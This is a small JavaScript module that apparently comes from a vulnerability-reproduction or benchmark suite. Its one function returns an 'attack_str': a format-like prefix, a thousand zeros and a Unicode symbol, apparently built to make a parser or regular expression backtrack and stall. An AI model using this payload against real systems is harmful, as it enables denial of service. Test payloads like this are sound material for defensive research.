function getPayload() {
  const genstr = require("../utils").genstr;
  return {
    attack_str: "%(0)0" + genstr(1000, "0") + "\u25CE"
  };
}

module.exports = { getPayload };